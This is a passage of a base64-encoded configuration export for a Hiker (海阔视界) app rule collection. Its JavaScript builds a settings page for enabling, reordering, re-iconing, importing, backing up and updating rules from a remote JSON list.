An4oCc4oCc4oCd4oCdPGZvbnQgY29sb3I9XFxcIiM2NjY2NjZcXFwiPjxzbWFsbD7nibnliKvpuKPosKLvvIzlsI/nqIvluo/mj5DkvpvogIXvvJpcXFxcbicgK1xcbiAgICAgICAgZGF0YS5yZWR1Y2UoKHNlbGYsIHYpID0+IHYuYXV0aG9yID8gc2VsZi5jb25jYXQodi5hdXRob3Iuc3BsaXQoJyYnKSkgOiBzZWxmLCBbXSlcXG4gICAgICAgIC5maWx0ZXIoKHYsIGksIGFycikgPT4gdiAmJiBhcnIuaW5kZXhPZih2KSA9PSBpKS5qb2luKCfjgIEnKSxcXG4gICAgdXJsOiAnaGlrZXI6Ly9lbXB0eScsXFxuICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMSdcXG59KVxcblxcbmVsLnB1c2goeyBjb2xfdHlwZTogJ2xpbmUnIH0sIHtcXG4gICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgJ/Cfk50nLnNtYWxsKCkgKyAnJm5ic3Ag6L275ZCI6ZuG6Ieq5a6a5LmJICZuYnNwJy5ib2xkKCkuZm9udGNvbG9yKCcjNzU3NTc1JykgKyAoZGlzYWJsZUN1c3RvbSA/ICfinYwnIDogJ+KtlScpLnNtYWxsKCksXFxuICAgIHVybDogJChbKGRpc2FibGVDdXN0b20gPyAn5ZCv55SoJyA6ICfnpoHnlKgnKSArICflkIjpm4boh6rlrprkuYknLCAn5riF6Zmk6Ieq5a6a5LmJ5pWw5o2uJywgJ+e8lui+kUpTT04nXSwgMSkuc2VsZWN0KCgpID0+IHtcXG4gICAgICAgIHN3aXRjaCAoaW5wdXQuc2xpY2UoMCwgMikpIHtcXG4gICAgICAgICAgICBjYXNlICfmuIXpmaQnOlxcbiAgICAgICAgICAgICAgICBkZWxldGVGaWxlKCdjdXN0b21EYXRhJylcXG4gICAgICAgICAgICAgICAgYnJlYWtcXG4gICAgICAgICAgICBjYXNlICflkK/nlKgnOlxcbiAgICAgICAgICAgICAgICBzYXZlRmlsZSgnZGlzYWJsZUN1c3RvbScsICcnKVxcbiAgICAgICAgICAgICAgICBicmVha1xcbiAgICAgICAgICAgIGNhc2UgJ+emgeeUqCc6XFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdkaXNhYmxlQ3VzdG9tJywgJ1QnKVxcbiAgICAgICAgICAgICAgICBpbnB1dCArPSAnXFxcXG7lsI/nqIvluo/lkK/nlKgv56aB55So44CB6YeN5paw5o6S5bqP562J5pON5L2c5Z2H5LiN5Lya5L2T546w5Zyo6aaW6aG15bCP56iL5bqP5YiX6KGo5LitJ1xcbiAgICAgICAgICAgICAgICBicmVha1xcbiAgICAgICAgICAgIGNhc2UgJ+e8lui+kSc6XFxuICAgICAgICAgICAgICAgIGxldCB1cmwgPSBnZXRNeVZhcigncmVtb3RlVXJsJylcXG4gICAgICAgICAgICAgICAgaWYgKCF1cmwuc3RhcnRzV2l0aCgnaGlrZXI6Ly9maWxlcy8nKSAmJiAhdXJsLnN0YXJ0c1dpdGgoJ2ZpbGU6Ly8nKSlcXG4gICAgICAgICAgICAgICAgICAgIHVybCA9ICdoaWtlcjovL2ZpbGVzL2xpYnMvJyArIG1kNSh1cmwpICsgJy5qcydcXG4gICAgICAgICAgICAgICAgcmV0dXJuICAnaGlrZXI6Ly9wYWdlL2ludGVyZmFjZSNub1JlZnJlc2gjI25vSGlzdG9yeSMjbm9SZWNvcmRIaXN0b3J5Iz9ydWxlPUpTT07nvJbovpHlmagmSnNvbj0nK2Jhc2U2NEVuY29kZSh1cmwpXFxuICAgICAgICB9XFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgIHJldHVybiAndG9hc3Q6Ly/lt7InICsgaW5wdXRcXG4gICAgfSksXFxuICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMScsXFxuICAgIGV4dHJhOiB7IGxpbmVWaXNpYmxlOiBmYWxzZSB9XFxufSk7XFxuKGRpc2FibGVDdXN0b20gPyBbJ+WvvOWFpea1t+mYlCddIDogWyflkK/nlKgv56aB55SoJywgJ+mHjeaWsOaOkuW6jycsICfmm7TmlLnlm77moIcnLCAn5a+85YWl5rW36ZiUJ10pLmZvckVhY2goKHYpID0+IHtcXG4gICAgZWwucHVzaCh7XFxuICAgICAgICB0aXRsZTogdiA9PSBlZGl0TW9kZSA/ICfigJzigJzigJ3igJ0nICsgdi5ib2xkKCkuZm9udGNvbG9yKCcjMTJiNjY4JykgOiB2LFxcbiAgICAgICAgdXJsOiB2ID09IGVkaXRNb2RlID8gJ2hpa2VyOi8vZW1wdHknIDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgodikgPT4ge1xcbiAgICAgICAgICAgIHB1dE15VmFyKCdlZGl0TW9kZScsIHYpXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxuICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgfSwgdiksXFxuICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxuICAgIH0pXFxufSk7XFxuaWYgKGVkaXRNb2RlID09ICflr7zlhaXmtbfpmJQnKSBlbC5wdXNoKHtcXG4gICAgdGl0bGU6ICflhajpg6jlr7zlhaUnLFxcbiAgICB1cmw6ICfmtbfpmJTop4bnlYzvv6Vob21lX3J1bGVfdXJs77+lJyArICh1cmwuc3RhcnRzV2l0aCgnaGlrZXI6Ly8nKSB8fCB1cmwuc3RhcnRzV2l0aCgnZmlsZTovLycpID8gdXJsIDogJ2hpa2VyOi8vZmlsZXMvbGlicy8nICsgbWQ1KHVybCkgKyAnLmpzJyksXFxuICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMScsXFxuICAgIGV4dHJhOiB7IGxpbmVWaXNpYmxlOiBmYWxzZSB9XFxufSk7XFxuKGRpc2FibGVDdXN0b20gPyBkYXRhIDogSlNPTi5wYXJzZShyZWFkRmlsZSgnY3VzdG9tRGF0YScpIHx8ICdbXScpKS5mb3JFYWNoKCh2LCBpKSA9PiB7XFxuICAgIGxldCBkID0geyB0aXRsZTogdi50aXRsZSwgaW1nOiBkYXRhW2ldLmljb24gfVxcbiAgICBzd2l0Y2ggKGVkaXRNb2RlKSB7XFxuICAgICAgICBjYXNlICflkK/nlKgv56aB55SoJzpcXG4gICAgICAgICAgICBkLnRpdGxlID0gKHYudmlzaWJsZSA/ICfwn5+iICAnIDogJ/CflLQgICcpICsgZC50aXRsZVxcbiAgICAgICAgICAgIGQudXJsID0gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoaSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSBKU09OLnBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJylcXG4gICAgICAgICAgICAgICAgcnVsZXNbaV0udmlzaWJsZSA9ICFydWxlc1tpXS52aXNpYmxlXFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdjdXN0b21EYXRhJywgSlNPTi5zdHJpbmdpZnkocnVsZXMpKVxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgIH0sIGkpXFxuICAgICAgICAgICAgYnJlYWtcXG4gICAgICAgIGNhc2UgJ+mHjeaWsOaOkuW6jyc6XFxuICAgICAgICAgICAgbGV0IHNvcnRGbGFnID0gcGFyc2VJbnQoZ2V0TXlWYXIoJ3NvcnRGbGFnJywgJy0xJykpXFxuICAgICAgICAgICAgZC50aXRsZSA9IChzb3J0RmxhZyA9PSBpID8gJ/CflIMgICcgOiAnJykgKyBkLnRpdGxlXFxuICAgICAgICAgICAgaWYgKHNvcnRGbGFnID09IC0xKVxcbiAgICAgICAgICAgICAgICBkLnVybCA9ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGkpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKCdzb3J0RmxhZycsIGkudG9TdHJpbmcoKSlcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+mAieaLqeimgeenu+WKqOWIsOeahOS9jee9ridcXG4gICAgICAgICAgICAgICAgfSwgaSlcXG4gICAgICAgICAgICBlbHNlXFxuICAgICAgICAgICAgICAgIGQudXJsID0gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgob2xkSW5kZXgsIG5ld0luZGV4KSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSBKU09OLnBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJylcXG4gICAgICAgICAgICAgICAgICAgIHJ1bGVzLnNwbGljZShuZXdJbmRleCwgMCwgcnVsZXMuc3BsaWNlKG9sZEluZGV4LCAxKVswXSlcXG4gICAgICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdjdXN0b21EYXRhJywgSlNPTi5zdHJpbmdpZnkocnVsZXMpKVxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoJ3NvcnRGbGFnJywgJy0xJylcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgICAgICB9LCBzb3J0RmxhZywgaSlcXG4gICAgICAgICAgICBicmVha1xcbiAgICAgICAgY2FzZSAn5pu05pS55Zu+5qCHJzpcXG4gICAgICAgICAgICBkLnVybCA9ICQodi5pY29uIHx8ICcnLCAn6L6T5YWl5paw5Zu+5qCH5Zyw5Z2A5oiW6aKc6Imy5Luj56CB77yaJykuaW5wdXQoKGkpID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGVzID0gSlNPTi5wYXJzZShyZWFkRmlsZSgnY3VzdG9tRGF0YScpIHx8ICdbXScpXFxuICAgICAgICAgICAgICAgIGlmIChpbnB1dClcXG4gICAgICAgICAgICAgICAgICAgIHJ1bGVzW2ldLmljb24gPSBpbnB1dFxcbiAgICAgICAgICAgICAgICBlbHNlXFxuICAgICAgICAgICAgICAgICAgICBkZWxldGUgcnVsZXNbaV0uaWNvblxcbiAgICAgICAgICAgICAgICBzYXZlRmlsZSgnY3VzdG9tRGF0YScsIEpTT04uc3RyaW5naWZ5KHJ1bGVzKSlcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgICAgICAgICB9LCBpKVxcbiAgICAgICAgICAgIGJyZWFrXFxuICAgICAgICBjYXNlICflr7zlhaXmtbfpmJQnOlxcbiAgICAgICAgICAgIGQudXJsID0gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoaSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgZGF0YSA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL2RhdGFMb2FkP3J1bGU9JyArIGdldE15VmFyKCdteUNvbGxlY3Rpb24nKSwgdHJ1ZSlcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdydWxlOi8vJyArIGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShkYXRhW2ldKSlcXG4gICAgICAgICAgICB9LCBpKVxcbiAgICAgICAgICAgIGJyZWFrXFxuICAgIH1cXG4gICAgZWwucHVzaChkKVxcbn0pXFxuc2V0UmVzdWx0KGVsKVxcblwiLFwiZ3JvdXBcIjpcIuKRpOKRoPCfk73vuI/mlabkvKZcIixcInVhXCI6XCJtb2JpbGVcIixcInByZVJ1bGVcIjpcInB1dE15VmFyKCdteUNvbGxlY3Rpb24nLCBNWV9SVUxFLnRpdGxlKVxcbnB1dE15VmFyKCdyZW1vdGVVcmwnLCAnaHR0cHM6Ly9tcGltZy5jbi9kb3duLnBocC80MDU3NGZjNDU3ZDg4MmQwYzNkYzdjYWU4OGQwODA3MS5qc29uJylcXG4vLyBcXG4vKlxcbiovXCIsXCJwYWdlc1wiOlwiW3tcXFwiY29sX3R5cGVcXFwiOlxcXCJ0ZXh0XzFcXFwiLFxcXCJuYW1lXFxcIjpcXFwiQ2xhc3NUYWJcXFwiLFxcXCJwYXRoXFxcIjpcXFwiQ2xhc3NUYWJcXFwiLFxcXCJydWxlXFxcIjpcXFwidmFyIHtcXFxcbiAgICBRSU5HX1RJVExFLCB0aXRsZSwgdXJsLFxcXFxuICAgIGNsYXNzX25hbWUsIGNsYXNzX3VybCxcXFxcbiAgICBhcmVhX25hbWUsIGFyZWFfdXJsLFxcXFxuICAgIHllYXJfbmFtZSwgeWVhcl91cmwsXFxcXG4gICAgc29ydF9uYW1lLCBzb3J0X3VybFxcXFxufSA9ICQuaW1wb3J0UGFyYW1cXFxcbmNvbnN0IENsYXNzVGFiID0gZnVuY3Rpb24oY2xhc3NBcnJheSwgcGFyYW1zKSB7XFxcXG4gICAgT2JqZWN0LmFzc2lnbih0aGlzLCBwYXJhbXMpXFxcXG4gICAgdGhpcy5hcnIgPSBjbGFzc0FycmF5Lm1hcCh2ID0+IHRoaXMuaW5pdCh2KSlcXFxcbiAgICB0aGlzLnNpZ24gPSAnJCcgKyBRSU5HX1RJVExFICsgJ18nICsgKHRoaXMubmFtZSB8fCAnJykgKyAnXydcXFxcbiAgICB0aGlzLmNvbG9yID0gdGhpcy5jb2xvciB8fCAnIzEyYjY2OCdcXFxcbiAgICB0aGlzLmJvdW5kYXJ5ID0gdGhpcy5ib3VuZGFyeSB8fCAnYmxhbmtfYmxvY2snXFxcXG59XFxcXG5DbGFzc1RhYi5wcm90b3R5cGUgPSB7XFxcXG4gICAgY29uc3RydWN0b3I6IENsYXNzVGFiLFxcXFxuICAgIGxvYWQoZWwpIHtcXFxcbiAgICAgICAgbGV0IGZvbGRlZCA9IHRoaXMuZm9sZCAmJiBnZXRWYXIoJyRmb2xkXycgKyB0aGlzLnNpZ24sICcnKVxcXFxuICAgICAgICBpZiAodGhpcy5hcnIubGVuZ3RoID4gMSAmJiB0aGlzLmZvbGQpIGVsLnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgKGZvbGRlZCA/ICfilrYnIDogJ+KWvCcpLmZvbnRjb2xvcignIzA0OWVmZicpLFxcXFxuICAgICAgICAgICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChzaWduLCBmb2xkZWQpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBwdXRWYXIoJyRmb2xkXycgKyBzaWduLCBmb2xkZWQgPyAnJyA6ICdUJylcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgICAgICAgICB9LCB0aGlzLnNpZ24sIGZvbGRlZCksXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxcXG4gICAgICAgIH0pXFxcXG4gICAgICAgIGxldCBhcnIgPSBmb2xkZWQgPyBbdGhpcy5hcnJbMF1dIDogdGhpcy5hcnJcXFxcbiAgICAgICAgYXJyLmZvckVhY2goKHYpID0+IHtcXFxcbiAgICAgICAgICAgIGxldCB7IGlkLCBjbGFzc19uYW1lLCBjbGFzc191cmwgfSA9IHYsXFxcXG4gICAgICAgICAgICBzZWxlY3RlZCA9IEpTT04uc3RyaW5naWZ5KHRoaXMuZ2V0Q2xhc3MoaWQpKVxcXFxuICAgICAgICAgICAgY2xhc3NfbmFtZS5mb3JFYWNoKChuYW1lLCBpKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHVybCA9IGNsYXNzX3VybFtpXSxcXFxcbiAgICAgICAgICAgICAgICAgICAgbm93ID0gSlNPTi5zdHJpbmdpZnkoeyBuYW1lOiBuYW1lLCB1cmw6IHVybCB9KVxcXFxuICAgICAgICAgICAgICAgIGVsLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogc2VsZWN0ZWQgPT0gbm93ID8gJ+KAnOKAnOKAneKAnScgKyBuYW1lLmZvbnRjb2xvcih0aGlzLmNvbG9yKS5ib2xkKCkgOiBuYW1lLFxcXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IHNlbGVjdGVkID09IG5vdyA/ICdoaWtlcjovL2VtcHR5JyA6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHNpZ24sIGlkLCBub3cpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dFZhcihzaWduICsgaWQsIG5vdylcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxuICAgICAgICAgICAgICAgICAgICB9LCB0aGlzLnNpZ24sIGlkLCBub3cpLFxcXFxuICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxcXG4gICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICBlbC5wdXNoKHsgY29sX3R5cGU6IHRoaXMuYm91bmRhcnkgfSlcXFxcbiAgICAgICAgfSlcXFxcbiAgICB9LFxcXFxuICAgIGluaXQoY2xhc3NPYmplY3QpIHtcXFxcbiAgICAgICAgaWYgKHR5cGVvZiBjbGFzc09iamVjdC5jbGFzc19uYW1lID09ICdzdHJpbmcnKVxcXFxuICAgICAgICAgICAgY2xhc3NPYmplY3QuY2xhc3NfbmFtZSA9IGNsYXNzT2JqZWN0LmNsYXNzX25hbWUuc3BsaXQoJyYnKVxcXFxuICAgICAgICBpZiAodHlwZW9mIGNsYXNzT2JqZWN0LmNsYXNzX3VybCA9PSAnc3RyaW5nJylcXFxcbiAgICAgICAgICAgIGNsYXNzT2JqZWN0LmNsYXNzX3VybCA9IGNsYXNzT2JqZWN0LmNsYXNzX3VybC5zcGxpdCgnJicpLm1hcCgodikgPT4gdi50cmltKCkpXFxcXG4gICAgICAgIHJldHVybiBjbGFzc09iamVjdFxcXFxuICAgIH0sXFxcXG4gICAgcHVzaChjbGFzc09iamVjdCkge1xcXFxuICAgICAgICB0aGlzLmFyci5wdXNoKHRoaXMuaW5pdChjbGFzc09iamVjdCkpXFxcXG4gICAgfSxcXFxcbiAgICBnZXRDbGFzcyhpZCkge1xcXFxuICAgICAgICBsZXQgZGVmYXVsdENsYXNzID0gdGhpcy5hcnIuZmluZChpdGVtID0+IGl0ZW0uaWQgPT0gaWQpXFxcXG4gICAgICAgIGRlZmF1bHRDbGFzcyA9IEpTT04uc3RyaW5naWZ5KGRlZmF1bHRDbGFzcyA/IHtcXFxcbiAgICAgICAgICAgIG5hbWU6IGRlZmF1bHRDbGFzcy5jbGFzc19uYW1lWzBdLFxcXFxuICAgICAgICAgICAgdXJsOiBkZWZhdWx0Q2xhc3MuY2xhc3NfdXJsWzBdXFxcXG4gICAgICAgIH0gOiB7IG5hbWU6ICAnY2Fubm90IGZpbmQgaWQ6ICcgKyBpZCArICcgaW4gY2xhc3NUYWI6ICcgKyB0aGlzLnNpZ24sIHVybDogJyd9KVxcXFxuICAgICAgICByZXR1cm4gSlNPTi5wYXJzZShnZXRWYXIodGhpcy5zaWduICsgaWQsIGRlZmF1bHRDbGFzcykpXFxcXG4gICAgfSxcXFxcbiAgICBzZXRVcmwodXJsKSB7XFxcXG4gICAgICAgIHJldHVybiB1cmwucmVwbGFjZSgvXFxcXFxcXFwkXFxcXFxcXFx7KFtefV0qKVxcXFxcXFxcfS9nLCAoXywgaWQpID0+IHRoaXMuZ2V0Q2xhc3MoaWQpLnVybClcXFxcbiAgICB9XFxcXG59XFxcXG4vLyDnlJ/miJDlpLTpg6jliIbnsbtcXFxcbmxldCBmeUFsbCA9IHVybC5pbmNsdWRlcygnZnlBbGwnKSxcXFxcbiAgICB0YWJIZWFkZXIgPSBbXVxcXFxuaWYgKGNsYXNzX25hbWUpIHRhYkhlYWRlci5wdXNoKHtcXFxcbiAgICBpZDogZnlBbGwgPyAnZnlBbGwnIDogJ2Z5Y2xhc3MnLFxcXFxuICAgIGNsYXNzX25hbWU6IGNsYXNzX25hbWUsXFxcXG4gICAgY2xhc3NfdXJsOiBjbGFzc191cmxcXFxcbn0pXFxcXG5pZiAoYXJlYV9uYW1lKSB0YWJIZWFkZXIucHVzaCh7XFxcXG4gICAgaWQ6IGZ5QWxsID8gJ2Z5QWxsJyA6ICdmeWFyZWEnLFxcXFxuICAgIGNsYXNzX25hbWU6IGFyZWFfbmFtZSxcXFxcbiAgICBjbGFzc191cmw6IGFyZWFfdXJsXFxcXG59KVxcXFxuaWYgKHllYXJfbmFtZSkgdGFiSGVhZGVyLnB1c2goe1xcXFxuICAgIGlkOiBmeUFsbCA/ICdmeUFsbCcgOiAnZnl5ZWFyJyxcXFxcbiAgICBjbGFzc19uYW1lOiB5ZWFyX25hbWUsXFxcXG4gICAgY2xhc3NfdXJsOiB5ZWFyX3VybFxcXFxufSlcXFxcbmlmIChzb3J0X25hbWUpIHRhYkhlYWRlci5wdXNoKHtcXFxcbiAgICBpZDogZnlBbGwgPyAnZnlBbGwnIDogJ2Z5c29ydCcsXFxcXG4gICAgY2xhc3NfbmFtZTogc29ydF9uYW1lLFxcXFxuICAgIGNsYXNzX3VybDogc29ydF91cmxcXFxcbn0pXFxcXG4kLmV4cG9ydHMgPSB7XFxcXG4gICAgZnlBbGw6IGZ5QWxsLFxcXFxuICAgIHRhYkhlYWRlcjogbmV3IENsYXNzVGFiKHRhYkhlYWRlciwgeyBuYW1lOiB0aXRsZSwgZm9sZDogcmVhZEZpbGUoJ3RhYkZvbGQnKSwgfSlcXFxcbn1cXFxcblxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJpY29uXzJfcm91bmRcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6K6+572uXFxcIixcXFwicGF0aFxcXCI6XFxcIkNvbmZpZ1xcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmFkZExpc3RlbmVyKCdvbkNsb3NlJywgJ2NsZWFyTXlWYXIoXFxcXFxcXCJzb3J0RmxhZ1xcXFxcXFwiKTtyZWZyZXNoUGFnZSgpJylcXFxcbnNldFBhZ2VUaXRsZSgn4pqZIOi9u+WQiOmbhuiuvue9riDimpknKVxcXFxuY29uc3QgUUlOR19USVRMRSA9IGdldE15VmFyKCdteUNvbGxlY3Rpb24nKSxcXFxcbiAgICB1cmwgPSBnZXRNeVZhcigncmVtb3RlVXJsJylcXFxcbmxldCBkYXRhID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZGF0YUxvYWQ/cnVsZT0nICsgUUlOR19USVRMRSwgdHJ1ZSksXFxcXG4gICAgZWwgPSBbe1xcXFxuICAgICAgICB0aXRsZTogJzxiPiDmuIXpmaTnvJPlrZjvvIznq4vljbPmm7TmlrAgPHNtYWxsPiDvvIjln7rkuo7ov5znqIvku5PlupPvvIzkuI3opoHpopHnuYHngrnlh7vvvIknLFxcXFxuICAgICAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHVybCkgPT4ge1xcXFxuICAgICAgICAgICAgaWYgKHVybC5zdGFydHNXaXRoKCdoaWtlcjovLycpIHx8IHVybC5zdGFydHNXaXRoKCdmaWxlOi8vJykpXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+S7k+W6k+S4uuacrOWcsOaWh+S7tu+8jOS4jeS8mui/m+ihjOe8k+WtmO+8jOacrOWKn+iDveS5n+aXoOaViCdcXFxcbiAgICAgICAgICAgIGRlbGV0ZUNhY2hlKHVybClcXFxcbiAgICAgICAgICAgIGJhY2soZmFsc2UpXFxcXG4gICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5bey5pu05pawJ1xcXFxuICAgICAgICB9LCB1cmwpLFxcXFxuICAgICAgICBpbWc6ICdoaWtlcjovL2ltYWdlcy9pY29uNCcsXFxcXG4gICAgICAgIGNvbF90eXBlOiAnYXZhdGFyJ1xcXFxuICAgIH1dLFxcXFxuICAgIHVwZGF0ZUludGVydmFsID0gcmVhZEZpbGUoJ3VwZGF0ZUludGVydmFsJykgfHwgJzEnLFxcXFxuICAgIG5ld1dpbmRvdyA9IHJlYWRGaWxlKCduZXdXaW5kb3cnKSxcXFxcbiAgICB0YWJGb2xkID0gcmVhZEZpbGUoJ3RhYkZvbGQnKSxcXFxcbiAgICBkaXNhYmxlQ3VzdG9tID0gcmVhZEZpbGUoJ2Rpc2FibGVDdXN0b20nKSxcXFxcbiAgICBlZGl0TW9kZSA9IGRpc2FibGVDdXN0b20gPyAn5a+85YWl5rW36ZiUJyA6IGdldE15VmFyKCdlZGl0TW9kZScsICflkK/nlKgv56aB55SoJylcXFxcblxcXFxuZWwucHVzaCh7XFxcXG4gICAgdGl0bGU6ICcgIPCfkqEg5pu05paw6aKR546HOiAnICsgKHVwZGF0ZUludGVydmFsID09IDAgPyAn5omL5YqoJyA6IHVwZGF0ZUludGVydmFsICsgJ+WkqScpICsgJyAgJyxcXFxcbiAgICB1cmw6ICQodXBkYXRlSW50ZXJ2YWwsICfovpPlhaXmm7TmlrDpl7TpmpTvvIjlpKnvvInvvIzkuLow5YiZ5omL5Yqo5pu05pawXFxcXFxcXFxu5pys5Zyw5paH5Lu26ZO+5o6l5peg5pWIJykuaW5wdXQoKCkgPT4ge1xcXFxuICAgICAgICBpbnB1dCA9IHBhcnNlSW50KGlucHV0KVxcXFxuICAgICAgICBpZiAoTnVtYmVyLmlzTmFOKGlucHV0KSkgaW5wdXQgPSAxXFxcXG4gICAgICAgIGVsc2UgaWYgKGlucHV0IDwgMSkgaW5wdXQgPSAwXFxcXG4gICAgICAgIHNhdmVGaWxlKCd1cGRhdGVJbnRlcnZhbCcsIGlucHV0LnRvU3RyaW5nKCkpXFxcXG4gICAgICAgIHJlZnJlc2hQYWdlKClcXFxcbiAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxuICAgIH0pLFxcXFxuICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXFxcbn0sIHtcXFxcbiAgICB0aXRsZTogJyAg8J+WpSDni6znq4vpppbpobU6ICcgKyAobmV3V2luZG93ID8gJ+aYrycgOiAn5ZCmJykgKyAnICAnLFxcXFxuICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgobmV3V2luZG93KSA9PiB7XFxcXG4gICAgICAgIHNhdmVGaWxlKCduZXdXaW5kb3cnLCBuZXdXaW5kb3cgPyAnJyA6ICdUJylcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoKVxcXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgfSwgbmV3V2luZG93KSxcXFxcbiAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxcXG59LCB7XFxcXG4gICAgdGl0bGU6ICcgIPCfkqAg5YiG57G75oqY5Y+gOiAnICsgKHRhYkZvbGQgPyAn5pivJyA6ICflkKYnKSArICcgICcsXFxcXG4gICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKCh0YWJGb2xkKSA9PiB7XFxcXG4gICAgICAgIHNhdmVGaWxlKCd0YWJGb2xkJywgdGFiRm9sZCA/ICcnIDogJ1QnKVxcXFxuICAgICAgICByZWZyZXNoUGFnZSgpXFxcXG4gICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcbiAgICB9LCB0YWJGb2xkKSxcXFxcbiAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxcXG59LCB7XFxcXG4gICAgdGl0bGU6ICcgIPCfkrwg5aSH5Lu95oGi5aSNICAnLFxcXFxuICAgIHVybDogJChbJ+Wkh+S7vScsICfmgaLlpI0nXSwgMSkuc2VsZWN0KChRSU5HX1RJVExFLCB1cGRhdGVJbnRlcnZhbCwgbmV3V2luZG93LCB0YWJGb2xkLCBkaXNhYmxlQ3VzdG9tKSA9PiB7XFxcXG4gICAgICAgIGxldCB1cmwgPSBnZXRNeVZhcigncmVtb3RlVXJsJylcXFxcbiAgICAgICAgaWYgKCF1cmwuc3RhcnRzV2l0aCgnaGlrZXI6Ly8nKSAmJiAhdXJsLnN0YXJ0c1dpdGgoJ2ZpbGU6Ly8nKSlcXFxcbiAgICAgICAgICAgIHVybCA9ICdoaWtlcjovL2ZpbGVzL2xpYnMvJyArIG1kNSh1cmwpICsgJy5qcydcXFxcbiAgICAgICAgZWxzZSBpZiAodXJsLnN0YXJ0c1dpdGgoJ2hpa2VyOi8vcGFnZS8nKSkgdXJsID0gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgICAgIGlmIChpbnB1dCA9PSAn5aSH5Lu9JykgcmV0dXJuICQoJ2hpa2VyOi8vZmlsZXMvdG1wLycgKyBRSU5HX1RJVExFICsgJ19iYWNrdXAuanNvbicsICfovpPlhaXlpIfku73ot6/lvoQnKVxcXFxuICAgICAgICAgICAgLmlucHV0KCh1cmwsIHVwZGF0ZUludGVydmFsLCBuZXdXaW5kb3csIHRhYkZvbGQsIGRpc2FibGVDdXN0b20pID0+IHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgcnV